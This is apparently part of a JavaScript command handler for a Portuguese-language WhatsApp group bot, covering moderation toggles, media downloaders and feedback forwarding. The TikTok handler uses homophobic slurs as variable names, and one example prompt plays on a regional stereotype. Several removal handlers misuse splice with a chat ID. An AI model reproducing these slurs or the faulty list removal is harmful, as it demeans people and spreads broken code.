case 'anticatalogo':
case 'anticatalg':  
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (Number(args[0]) === 1) {
if (isAnticatalogo) return reply('Ja esta ativo')
anticatalogo.push(from)
fs.writeFileSync('./funções de cmd/antis/anticatalogo.json', JSON.stringify(anticatalogo))
reply('[🌹️] Ativou com sucesso o recurso de anticatalogo neste grupo.')
} else if (Number(args[0]) === 0) {
if (!isAnticatalogo) return reply('Ja esta Desativado')
pesquisar = from
processo = anticatalogo.indexOf(pesquisar)
while(processo >= 0){
anticatalogo.splice(processo, 1)
processo = anticatalogo.indexOf(pesquisar)
}
fs.writeFileSync('./funções de cmd/antis/anticatalogo.json', JSON.stringify(anticatalogo))
reply('‼️ Desativou com sucesso o recurso de anticatalogo neste grupo✔️')
} else {
if(isAnticatalogo){
buttons02 = [
{buttonId: `${prefix + command} 0`, buttonText: {displayText: 'Desativar ✘'}, type: 1}
]
} else {
buttons02 = [
{buttonId: `${prefix + command} 1`, buttonText: {displayText: 'Ativar ✓'}, type: 1}
]
}
buttonMessage02 = {
text: `[👥] 𝐀𝐍𝐓𝐈-𝐂𝐀𝐓𝐀́𝐋𝐎𝐆𝐎 [👥]`,
footer: `O anti catálogo está ${isAnticatalogo ? 'ativado' : 'desativado'}\n`,
buttons: buttons02,
headerType: 4,
contextInfo:{forwardingScore:999, isForwarded:true}
}
nezuko.sendMessage(from, buttonMessage02, {quoted: dnselo})
}
break

case 'botoff':
case 'boton':
if (!isGroup) return reply(enviar.msg.grupo)
if(!SoDono) return reply("<❗> Apenas meu mestre pode executar esse comando.")
if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
if (botoff.includes(from)) return reply('Ja esta ativo')
botoff.push(from)
fs.writeFileSync('./funções de cmd/grupos/botoff.json', JSON.stringify(botoff))
reply('Desativando funções e parando a execução de comandos por membros com sucesso...')
} else if (Number(args[0]) === 0) {
if (!botoff.includes(from)) return reply('Ja esta Desativado')
pesquisar = from
processo = botoff.indexOf(pesquisar)
while(processo >= 0){
botoff.splice(processo, 1)
processo = botoff.indexOf(pesquisar)
}
fs.writeFileSync('./funções de cmd/grupos/botoff.json', JSON.stringify(botoff))
reply(`Ativando todos os funcionamentos do bot novamente...`)
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antifake':
                if (!m.isGroup) return m.reply('Só em Grupo')
                if (!isGroupAdmins) return m.reply('Você Não é Adm')
                if (!isBotGroupAdmins) return m.reply('o bot precisa ser adm')
                buttonsi = [
                    { buttonId: `${prefix}varfake 0`, buttonText: { displayText: '🔑 DESATIVAR' }, type: 1 },
                    { buttonId: `${prefix}varfake 1`, buttonText: { displayText: '🔒 ATIVAR' }, type: 1 }
                ]

                buttonMessageiu = {
                    text: `Atualmente o Antifake Está ${isAntifake ? 'Ativo' : 'Desativado'}`,
                    footer: `Bᥡ: ${NomeDoBot}`,
                    buttons: buttonsi,
                    headerType: 1
                }

                await nezuko.sendMessage(m.chat, buttonMessageiu, { quoted: m })

                break

            case 'varfake':

                if (!m.isGroup) return m.reply('Só em Grupo')
                if (!isGroupAdmins) return m.reply('Você Não é Adm')
                if (!isBotGroupAdmins) return m.reply('o bot precisa ser adm')
                if (args.length < 1) return m.reply('Ative pressione 1, Desativar pressione 0')
                if (Number(args[0]) === 1) {
                    if (isAntifake) return m.reply(`O recurso de  Anti fake já está Ativado neste grupo: ${groupName}`)
                    if (isAntifake) return m.reply('*O recurso de Anti fake já estava ativo antes*')
                    antifake.push(m.chat)
                    fs.writeFileSync('./funções de cmd/antis/antifake.json', JSON.stringify(antifake))
                    reply(`Antifake foi ativado com sucesso neste grupo - : ${groupName}`)
                } else if (Number(args[0]) === 0) {
                    if (!isAntifake) return reply(`O recurso de  Anti fake já está Desativado neste grupo.`)
                    antifake.splice(m.chat, 1)
                    fs.writeFileSync('./funções de cmd/antis/antifake.json', JSON.stringify(antifake))
                    reply(`Antifake foi Desativado com sucesso neste grupo - : ${groupName}`)
                } else {
                    reply('「* Adicionar parâmetro 1 ou 0 ')
                }
                break

case 'sn':
if (!isGroup) return reply(enviar.msg.grupo)
const sn = ['sim', 'não', 'com certeza', 'com certeza não']
gosto = q
if (args.length < 1) return reply(`Você deve fazer uma pergunta...\nExemplo: ${prefix}sn O ${pushname} é um baiano preguiçoso?`)
const jawab = sn[Math.floor(Math.random() * (sn.length))]
hasil = `${gosto}\n\nSegundo meus cálculos, eu acredito que... ${jawab}`
reply(hasil)
break

case 'antiloc':
if (!isGroup) return reply(` SOMENTE EM GRUPOS`)
if (!isGroupAdmins) return reply(`PRECISA SER ADMIN`)
if (!isBotGroupAdmins) return reply(` O BOT PRECISA SER ADMIN`)
try {		 
if (args.length < 1) return reply('1 pra ativar, 0 pra desligar')
if (Number(args[0]) === 1) {
if(Antiloc) return reply('Já está Ativo.')
antiloc.push(from)
fs.writeFileSync('./funções de cmd/antis/antiloc.json', JSON.stringify(antiloc))
reply('Ativou com sucesso o recurso de anti loc neste grupo✔️')
} else if (Number(args[0]) === 0) {
if(!Antiloc) return reply('Já está Desativado.')
antiloc.splice(from, 1)
fs.writeFileSync('./funções de cmd/antis/antiloc.json', JSON.stringify(antiloc))
reply('Desativou com sucesso o recurso de anti loc neste grupo✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
} catch {
reply('Deu erro, tente novamente :/')
}
break

case 'antidocumento':
case 'antidoc':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
if (Antidoc) return reply('Ja esta ativo')
antidoc.push(from)
fs.writeFileSync('./funções de cmd/antis/antidoc.json', JSON.stringify(antidoc))
reply('⚡ Ativou com sucesso o recurso de anti documento neste grupo 📝')
} else if (Number(args[0]) === 0) {
if (!Antidoc) return reply('Ja esta Desativado')
pesquisar = from
processo = antidoc.indexOf(pesquisar)
while(processo >= 0){
antidoc.splice(processo, 1)
processo = antidoc.indexOf(pesquisar)
}
fs.writeFileSync('./funções de cmd/antis/antidoc.json', JSON.stringify(antidoc))
reply('‼️ Desativou com sucesso o recurso de anti documento neste grupo✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antiimg':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isAntiImg) return reply('Já Esta ativo')
antiimg.push(from)
fs.writeFileSync('./funções de cmd/antis/antiimg.json', JSON.stringify(antiimg))
reply('Ativou com sucesso o recurso de anti imagem neste grupo✔️')
} else if (Number(args[0]) === 0) {
if (!isAntiImg) return reply('Ja esta Desativado.')
antiimg.splice(from, 1)
fs.writeFileSync('./funções de cmd/antis/antiimg.json', JSON.stringify(antiimg))
reply('Desativou com sucesso o recurso de anti imagem neste grupo✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antisticker':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isAntiSticker) return reply('Já Esta ativo')
antisticker.push(from)
fs.writeFileSync('./funções de cmd/antis/antisticker.json', JSON.stringify(antisticker))
reply('Ativou com sucesso o recurso de anti sticker neste grupo✔️')
} else if (Number(args[0]) === 0) {
if (!isAntiSticker) return reply('Ja esta Desativado.')
antisticker.splice(from, 1)
fs.writeFileSync('./funções de cmd/antis/antisticker.json', JSON.stringify(antisticker))
reply('Desativou com sucesso o recurso de anti sticker neste grupo✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antinotas':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isAntiNotas) return reply('Já Esta ativo')
antinotas.push(from)
fs.writeFileSync('./funções de cmd/antis/antinotas.json', JSON.stringify(antinotas))
reply('Ativou com sucesso o recurso de anti notas neste grupo✔️')
} else if (Number(args[0]) === 0) {
if (!isAntiNotas) return reply('Ja esta Desativado.')
antinotas.splice(from, 1)
fs.writeFileSync('./funções de cmd/antis/antinotas.json', JSON.stringify(antinotas))
reply('Desativou com sucesso o recurso de anti notas neste grupo✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antivideo':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isAntiVid) return reply('Ja esta ativo')
antivid.push(from)
fs.writeFileSync('./funções de cmd/antis/antivideo.json', JSON.stringify(antivid))
reply('Ativou com sucesso o recurso de anti video neste grupo✔️')
} else if (Number(args[0]) === 0) {
if (!isAntiVid) return reply('Ja esta Desativado')
antivid.splice(from, 1)
fs.writeFileSync('./funções de cmd/antis/antivideo.json', JSON.stringify(antivid))
reply('Desativou com sucesso o recurso de anti video neste grupo✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antiaudio':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isAntiAudio) return reply('Ja esta ativo')
antiaudio.push(from)
fs.writeFileSync('./funções de cmd/antis/antiaudio.json', JSON.stringify(antiaudio))
reply('Ativou com sucesso o recurso de anti audio neste grupo✔️')
} else if (Number(args[0]) === 0) {
if (!isAntiAudio) return reply('Ja esta Desativado')  
antiaudio.splice(from, 1)
fs.writeFileSync('./funções de cmd/antis/antiaudio.json', JSON.stringify(antiaudio))
reply('Desativou com sucesso o recurso de anti audio neste grupo✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'limitecaracteres':
case 'limiteflood':  
if (!isGroup) return reply(enviar.msg.adm)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply(`Digite ${prefix + command} 1 para ativar`)
if (Number(args[0]) === 1) {
if (isAntiFlood) return reply(`⚡ O recurso limite de caracteres até ${limitefl} já está ativo no grupo ⚡`)
antiflood.push(from)
fs.writeFileSync('./funções de cmd/usuarios/antiflood.json', JSON.stringify(antiflood))
reply(`<❗> ️O recurso limite de caracteres ${limitefl} foi ativado nesse grupo.`)
} else if (Number(args[0]) === 0) {
 if (!isAntiFlood) return reply('<❗> O recurso limite de caracteres não está ativado no grupo .')
let position = false
Object.keys(antiflood).forEach((i) => {
if (antiflood[i] === from) {
position = i
}
})
if (position !== false) {
antiflood.splice(position, 1)
fs.writeFileSync('./funções de cmd/usuarios/antiflood.json', JSON.stringify(antiflood))
}
reply('O recurso limite de caracteres foi desativado nesse grupo ✔️')
} else {
reply(`Digite ${prefix + command} 1 para ativar, 0 para desativar o recurso`)
}
break

case 'resetarttt':
case 'rvttt':  
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
daily.splice([])
fs.writeFileSync('./funções de cmd/usuarios/diario.json', JSON.stringify(daily))
reply('<❗> O jogo da velha TTT foi resetado com sucesso..✔️')
reply(`${prefix}reiniciar`)
break

case 'antipalavrão':
case 'antipalavrao':  
case 'antipalavra':    
if (!isGroup) return reply(`<❗> SOMENTE EM GRUPOS`)
if (!isGroupAdmins) return reply(`<❗> O PRECISA SER ADMIN`)
if (!isBotGroupAdmins) return reply(`<❗> O BOT PRECISA SER ADMIN`)
if (args.length < 1) return reply(`<❗> 1 / 0, Exemplo ${prefix + command} 1`)
if (Number(args[0]) === 1) {
if (isPalavrao) return reply('Ja esta ativo.')
palavrao.push(from)
fs.writeFileSync('./funções de cmd/grupos/palavrao.json', JSON.stringify(palavrao))
reply('⚡ Ativou com sucesso o recurso de Anti Palavras hardcore neste grupo.')
} else if (Number(args[0]) === 0) {
if (!isPalavrao) return reply('Ja esta Desativado')
pesquisar = from
processo = palavrao.indexOf(pesquisar)
while(processo >= 0){
palavrao.splice(processo, 1)
processo = palavrao.indexOf(pesquisar)
}
fs.writeFileSync('./funções de cmd/grupos/palavrao.json', JSON.stringify(palavrao))
reply('<❗> Desativou com sucesso o recurso de Anti Palavra harcore neste grupo.')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antilinkhard':
case 'antilink':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (Number(args[0]) === 1) {
if (isAntiLinkHard) return reply('Ja esta ativo')
antilinkhard.push(from)
fs.writeFileSync('./funções de cmd/antis/antilinkhard.json', JSON.stringify(antilinkhard))
reply('[⚡️] Ativou com sucesso o recurso de antilink hardcore neste grupo.')
} else if (Number(args[0]) === 0) {
if (!isAntiLinkHard) return reply('Ja esta Desativado')
pesquisar = from
processo = antilinkhard.indexOf(pesquisar)
while(processo >= 0){
antilinkhard.splice(processo, 1)
processo = antilinkhard.indexOf(pesquisar)
}
fs.writeFileSync('./funções de cmd/antis/antilinkhard.json', JSON.stringify(antilinkhard))
reply('<❗> Desativou com sucesso o recurso de antilink harcore neste grupo.')
} else {
if(isAntiLinkHard){
buttons02 = [{buttonId: `${prefix + command} 0`, buttonText: {displayText: 'Desativar ✘'}, type: 1}]
} else {
buttons02 = [{buttonId: `${prefix + command} 1`, buttonText: {displayText: 'Ativar ✓'}, type: 1}]
}
buttonMessage02 = {
text: `[🌹] 𝐀𝐍𝐓𝐈-𝐋𝐈𝐍𝐊 𝐇𝐀𝐑𝐃 [🌹]`,
footer: `O anti link está ${isAntiLinkHard ? 'ativado' : 'desativado'}\n`,
buttons: buttons02,
headerType: 4,
contextInfo:{forwardingScore:999, isForwarded:true}
}
nezuko.sendMessage(from, buttonMessage02, {quoted: dnselo})
}
break

case 'antilinkgp':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (Number(args[0]) === 1) {
if (isAntilinkgp) return reply('Ja esta ativo')
antilinkgp.push(from)
fs.writeFileSync('./funções de cmd/antis/antilinkgp.json', JSON.stringify(antilinkgp))
reply('[⚡️] Ativou com sucesso o recurso de antilinkgp.')
} else if (Number(args[0]) === 0) {
if (!isAntilinkgp) return reply('Ja esta Desativado')
pesquisar = from
processo = antilinkgp.indexOf(pesquisar)
while(processo >= 0){
antilinkgp.splice(processo, 1)
processo = antilinkgp.indexOf(pesquisar)
}
fs.writeFileSync('./funções de cmd/antis/antilinkgp.json', JSON.stringify(antilinkgp))
reply('<❗> Desativou com sucesso o recurso de antilink de grupo.️')
} else {
if(isAntilinkgp){
buttons02 = [
{buttonId: `${prefix + command} 0`, buttonText: {displayText: 'Desativar ✘'}, type: 1}
]
} else {
buttons02 = [
{buttonId: `${prefix + command} 1`, buttonText: {displayText: 'Ativar ✓'}, type: 1},
]
}
buttonMessage02 = {
text: `[🏓] 𝐀𝐍𝐓𝐈-𝐋𝐈𝐍𝐊 [🏓]`,
footer: `O anti link grupo está ${isAntilinkgp ? 'ativado' : 'desativado'}\n`,
buttons: buttons02,
headerType: 4,
contextInfo:{forwardingScore:999, isForwarded:true}
}
nezuko.sendMessage(from, buttonMessage02, {quoted: dnselo})
}
break

case 'adeuscara':
    case 'tchau':
        if (!isGroup) return reply('Só em Grupo')
        if (!isGroupAdmins) return reply('Você Não é Adm')
        if (!isBotGroupAdmins) return reply('o bot precisa ser adm')
        buttonsi = [
            { buttonId: `${prefix}varadeus 0`, buttonText: { displayText: '🔑 DESATIVAR' }, type: 1 },
            { buttonId: `${prefix}varadeus 1`, buttonText: { displayText: '🔒 ATIVAR' }, type: 1 }
        ]

        buttonMessageiu = {
            text: `Atualmente o AdeusCara Está ${isAdeusCara ? 'Ativo' : 'Desativado'}`,
            footer: `By: ${NomeDoBot}`,
            buttons: buttonsi,
            headerType: 1
        }

        await nezuko.sendMessage(from, buttonMessageiu, { quoted: info })

        break
    case 'varadeus':
        if (!isGroup) return reply(enviar.msg.grupo)
        if (!isGroupAdmins) return reply(enviar.msg.adm)
        if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
        if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
        if (Number(args[0]) === 1) {
            if (isAdeusCara) return reply('Ja esta ativo')
            adeuscara.push(from)
            fs.writeFileSync('./funções de cmd/grupos/adeus.json', JSON.stringify(adeuscara))
            reply('🌀 Ativou com sucesso o recurso de adeuscara neste grupo 📝')
        } else if (Number(args[0]) === 0) {
            if (!isAdeusCara) return reply('Ja esta Desativado')
            pesquisar = from
            processo = adeuscara.indexOf(pesquisar)
            while (processo >= 0) {
                adeuscara.splice(processo, 1)
                processo = adeuscara.indexOf(pesquisar)
            }
            fs.writeFileSync('./funções de cmd/grupos/adeus.json', JSON.stringify(adeuscara))
            reply('‼️ Desativou com sucesso o recurso de adeuscara neste grupo✔️')
        } else {
            reply('1 para ativar, 0 para desativar')
        }
        break

    case 'bemvindo':
    case 'welcome':

        if (!isGroup) return reply('Só em Grupo')
        if (!isGroupAdmins) return reply('Você Não é Adm')
        if (!isBotGroupAdmins) return reply('o bot precisa ser adm')
        buttonsi = [
            { buttonId: `${prefix}varbemvindo 0`, buttonText: { displayText: '🔑 DESATIVAR' }, type: 1 },
            { buttonId: `${prefix}varbemvindo 1`, buttonText: { displayText: '🔒 ATIVAR' }, type: 1 }
        ]

        buttonMessageiu = {
            text: `Atualmente o Bemvindo Está ${isWelkom ? 'Ativo' : 'Desativado'}`,
            footer: `By: ${NomeDoBot}`,
            buttons: buttonsi,
            headerType: 1
        }

        await nezuko.sendMessage(from, buttonMessageiu, { quoted: info })

        break
    case 'varbemvindo':
        if (!isGroup) return reply(enviar.msg.grupo)
        if (!isGroupAdmins) return reply(enviar.msg.adm)
        if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
        if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
        if (Number(args[0]) === 1) {
            if (isWelkom) return reply('Ja esta ativo')
            welkom.push(from)
            fs.writeFileSync('./funções de cmd/grupos/bemvindo.json', JSON.stringify(welkom))
            reply('🌀 Ativou com sucesso o recurso de bem vindo neste grupo 📝')
        } else if (Number(args[0]) === 0) {
            if (!isWelkom) return reply('Ja esta Desativado')
            pesquisar = from
            processo = welkom.indexOf(pesquisar)
            while (processo >= 0) {
                welkom.splice(processo, 1)
                processo = welkom.indexOf(pesquisar)
            }
            fs.writeFileSync('./funções de cmd/grupos/bemvindo.json', JSON.stringify(welkom))
            reply('‼️ Desativou com sucesso o recurso de bemvindo neste grupo✔️')
        } else {
            reply('1 para ativar, 0 para desativar')
        }
        break



//==========BAIXAR/PESQUISAS============\\

case 'pinterest': 
if(!q) return reply(`Digite o nome da imagem que vc quer buscar\nExemplo: ${prefix + command} cat`)
reply(enviar.espere)
hx.pinterest(q)
.then(result => {
angkaa = ['1','2','3','4','5','6','7','8','9']
const randomnay2 = angkaa[Math.floor(Math.random() * (angkaa.length))]	
const buttons01 = [{buttonId: `${prefix + command} ${q}`, buttonText: {displayText: '<❗> PRÓXIMO <❗>'}, type: 1}]
const buttonMessage01 = {image: {url: result[randomnay2]},caption: "AQUI ESTÁ!!",footer: 'PRESSIONE O BOTÃO ABAIXO PARA A PRÓXIMA FOTO',buttons: buttons01,headerType: 4}
nezuko.sendMessage(from, buttonMessage01, {quoted:m}).catch(e => {
reply('Erro, nenhuma imagem recebida.')
})}) 
break 

case 'wallpaper': {
if(!q) return reply(`Digite o nome da imagem que vc quer buscar\nExemplo: ${prefix + command} fotos`)
  reply(enviar.espere)
  let anu = await wallpaper(q)
  result = anu[Math.floor(Math.random() * anu.length)]
  let buttonswallpaper = [{buttonId: `${prefix}wallpaper ${q}`, buttonText: {displayText: '<❗> PRÓXIMO <❗>'}, type: 1}]
  nezuko.sendMessage(from, { image: { url: result.image[0] }, caption: `AQUI ESTÁ!!`, footer: 'PRESSIONE O BOTÃO ABAIXO PARA A PRÓXIMA FOTO',buttons: buttonswallpaper }, { quoted: dnselo}).catch(e => {
reply('Erro, nenhuma imagem recebida.')
})
  }
  break

case 'tiktok2':
try {
if(!q) return reply("Cadê o link?")
if(!isUrl(args[0]) || !args[0].includes("tiktok")) return reply("Link inválido")
reply (enviar.espere)
sex = await xfar.downloader.tiktok(args[0])
plsexual = []
for (let plgay of sex.media) {
if (plgay.quality === "hd") plsexual.push(plgay.url)
}
if(plsexual.length === 0) return reply("<❗> Não consegui encontrar o vídeo.")
plviado = await getBuffer(`${plsexual[Math.floor(Math.random() * plsexual.length)]}`)
nezuko.sendMessage(from, {video: plviado, caption: `${sex.title}`}, {quoted: dnselo})
} catch {
reply("<❗> Deu um erro.")
}
break

  case 'pinterest2': 
try {
if(!q) return reply(`Digite o nome da imagem que vc quer buscar\nExemplo: ${prefix + command} cat`)
reply(enviar.espere)
blap = await getBuffer(`https://nezsab-apis.xyz/api/pinterest?text=${q}&apikey=${keyapi}`)
await nezuko.sendMessage(from, {image: blap, thumbnail: null}, {quoted: dnselo}).catch(e => {
reply('ERROR!!')
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar")   
} else {
reply('ERROR!!')
}
}
break

case 'tradutor': case 'traduzir':
try {
if(!q) return reply(`Exemplo : ${prefix}tradutor HI`)
bla = await fetchJson(`https://nezsab-apis.xyz/api/tradutor?text=${args.join(" ")}&idioma=pt&apikey=${keyapi}`)
blatxt = ` [🎴] Olá ${pushname} [🎴️] \n\n seu texto ${q} foi traduzida pra ->\n\n ${bla.bla}`
blalogo = await getBuffer(`${logo}`)
nezuko.sendMessage(from, {text: blatxt, contextInfo: { externalAdReply:{title: `[🎴️] TRADUZIDO [🎴️] `,body:"", previewType:"PHOTO",thumbnail: blalogo}}}, {quoted: dnselo}).catch(e => {
reply("ERROR!!")
console.log(e)
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar")   
} else {
reply('ERROR!!')
}
}
break

case 'gimage':
case 'google':
try {
if (!q) return reply(`O que você está procurando?\n\nEx.: ${prefix + command} gatinhos fofinhos`)
let gis = require('./funções de cmd/funções/gimage.js')
gis(args.join(" "), async (error, result) => {
if (error) {
return sendBtext(from, `Ocorreu um erro`, `Aperte no botão abaixo para tentar novamente.`, [{buttonId: `${prefix + command} ${q}`, buttonText: {displayText: `Tentar Novamente`}, type: 1}], info)
}
n = result
try {
images = n[Math.floor(Math.random() * n.length)]
let buttons = [
{buttonId: `${prefix}gimage ${args.join(" ")}`, buttonText: {displayText: 'Proximo'}, type: 1}
]
let buttonMessage = {
image: { url: images.url },
caption: `Pronto!`,
buttons: buttons,
headerType: 4,
}
nezuko.sendMessage(from, buttonMessage, { quoted: info })
} catch {
sendBtext(from, `Nenhuma imagem recebida.`, `Aperte no botão abaixo para tentar novamente.`, [{buttonId: `${prefix + command} ${q}`, buttonText: {displayText: `Tentar Novamente`}, type: 1}], info)
}
})
} catch {
sendBtext(from, `Ocorreu um erro`, `Aperte no botão abaixo para tentar novamente.`, [{buttonId: `${prefix + command} ${q}`, buttonText: {displayText: `Tentar Novamente`}, type: 1}], info)
console.log("O MODULO caiu ou não foi possivel executar esta ação., espere retornar") 
}
break

case 'avaliar': //melifudax akv
var sections = [
    {
	title: `Aᴠᴀʟɪᴀᴄ̧ᴀ̃ᴏ ${NomeDoBot}`,
	rows: [
	     {title: "★☆☆☆☆", rowId: `${prefix}avaliar2 1`, description: "Péssimo 😡"},
	     {title: "★★☆☆☆", rowId: `${prefix}avaliar2 2`, description: "Ruim 😒"},
	     {title: "★★★☆☆", rowId: `${prefix}avaliar2 3`, description: "Regular 😐"},
	     {title: "★★★★☆", rowId: `${prefix}avaliar2 4`, description: "Bom 😊"},
	     {title: "★★★★★", rowId: `${prefix}avaliar2 5`, description: "Excelente 😄"}
		]
    },
   {
	title: "𝗦𝗜𝗦𝗧𝗘𝗠𝗔𝗦⬇️",
	rows: [
         {title: "Contratar", rowId: `${prefix}contratar`, description: "Política De Privacidade"},
	     {title: "Bug ⛔", rowId: `${prefix}bug`, description: "Informar Sobre Bugs"}
		]
    },
    {
    title: "=================",
    rows: [
   {title: "↩️ Voltar ao menu", rowId: `${prefix}menu`}
   ]
   }
]

const evaluation = {
  text: `*Sᴜᴀ Aᴠᴀʟɪᴀᴄ̧ᴀ̃ᴏ Sᴇʀᴀ́ Eɴᴠɪᴀᴅᴀ Pᴀʀᴀ O Sᴜᴘᴏʀᴛᴇ Dᴏ Bᴏᴛ ❗*\n`,
  title: ``,
  footer: `Seu Feedback É Muito Importante Para Podermos Saber Se Você Está Gostando Da ${NomeDoBot}, Estamos Em Contante Evolução Para Dar O Melhor Bot Para Todos Os Usuários(as)...`,
  buttonText: "𝘼𝙫𝙖𝙡𝙞𝙖𝙧 ☕",
  sections
}


nezuko.sendMessage(from, evaluation, {quoted: dnselo})
break

case 'bug':
case 'reporte':
case 'reporta':
if (!texto) return reply('Cadê o a mensagem do bug');
if (texto.length > 500) return reply('Até 500 características');
 try {
 let reportt = `[❗𝐑𝐄𝐏𝐎𝐑𝐓❗]
👤 Reportado por @${sender.split("@")[0]} 
✏️ Mensagem: ${texto}`
nezuko.sendMessage(`120363027726655541@g.us`, {text: reportt, mentions: [sender]});
} catch (a) {
reply('Falha ao fazer suporte❗');
}
break

case 'avaliar2':
var nomor = info.participant
tristan = args + ' Estrelas'

teks1 = `「 Aᴠᴀʟɪᴀᴄ̧ᴀ̃ᴏ 」\n\nUsuário(a): ${pushname}\n\nNumero: wa.me/${sender.split("@s.whatsapp.net")[0]}\n\nChat: ${groupName}\n\nFeedback: ${tristan}`
await nezuko.sendMessage(`${numerodonoa}@s.whatsapp.net`, {text: teks1}, {quoted: dnselo})
reply(`Ola ${pushname}, obrigado Por Avaliar! O Seu Feedback é muito importante para podermos saber se você está gostando da 𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿, estaremos melhorando a cada dia! 🐱`)
break
//melifunfax_akv    

case 'igdl':
case 'instadw': 
try {  
link = args.join(' ')
if (!link) return reply('Ops, insira o link de um video/foto do instagram.')
post = await fetchJson(`https://nezsab-apis.xyz/api/instagram?url=${link}&apikey=${keyapi}`)
s_video = await getBuffer(post.resultado[0].downloadUrl)
nezuko.sendMessage(from, {video: s_video}, {quoted: dnselo})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar")   
} else {
reply('ERROR!')
}
}
break

case 'ytshorts': case 'shorts':
{
teks = args.join(" ");
if (!teks) return reply(`Cadê o link?`)
if (isUrl(teks[0]) && !teks[0].includes('youtube.com/shorts/')) return reply("Link precisa ser do YouTube Shorts!")
buffer = await fetchJson(`https://nezsab-apis.xyz/api/ytmp4-2?url=${teks}&apikey=${keyapi}`)
imagemT = await getBuffer(buffer.resultado.thumb)
let buttons = [
{buttonId: `${prefix}shorts_audio ${q}`, buttonText: {displayText: '🎶 Baixar [ Formato: Áudio ]'}, type: 1}, 
{buttonId: `${prefix}shorts_video ${q}`, buttonText: {displayText: '🎦 Baixar [ Formato: Vídeo ]'}, type: 1}, 
{buttonId: `${prefix}shorts_docvid ${q}`, buttonText: {displayText: '📄 Baixar [ Formato: Doc ]'}, type: 1}]
let thumbInfo = `ೋ🔖️️ 𝘛𝘪́𝘵𝘶𝘭𝘰⧽ ${buffer.resultado.título}\nೋ📁 𝘊𝘢𝘯𝘢𝘭⧽ ${buffer.resultado.canal}\nೋ📬 𝘗𝘶𝘣𝘭𝘪𝘤𝘢𝘥𝘰⧽ ${buffer.resultado.publicado}\nೋ📊️️ 𝘝𝘪𝘴𝘶𝘢𝘭𝘪𝘻𝘢𝘤̧𝘰̃𝘦𝘴⧽ ${buffer.resultado.visualizações}`;
buttonMessage = {image: imagemT, caption: `${thumbInfo}`, footer: `Escolha o formato que você deseja! <3`, buttons: buttons, headerType: 4}
nezuko.sendMessage(from, buttonMessage, {quoted: dnselo})
}
break

case 'shorts_docvid': 
teks = args.join(" ");
if (!teks) return enviar(`Cade o link?`)
if (isUrl(teks[0]) && !teks[0].includes('youtube.com/shorts/')) return reply("Link precisa ser do YouTube Shorts!")
reply(enviar.espere)
buffer = await fetchJson(`https://nezsab-apis.xyz/api/ytmp4-2?url=${teks}&apikey=${keyapi}`)
videokk = await getBuffer(buffer.resultado.link)
nezuko.sendMessage(from, {document: videokk, mimetype: 'video/mp4', fileName: `${buffer.resultado.título}.mp4`}, {quoted:dnselo}).catch(e => {
console.log(e)
reply("ERRO!")
})
break

case 'shorts_audio': 
teks = args.join(" ");
if (!teks) return enviar(`Cade o link?`)
if (isUrl(teks[0]) && !teks[0].includes('youtube.com/shorts/')) return reply("Link precisa ser do YouTube Shorts!")
reply(enviar.espere)
buffer = await fetchJson(`https://nezsab-apis.xyz/api/ytmp4-2?url=${teks}&apikey=${keyapi}`)
videokk = await getBuffer(buffer.resultado.link)
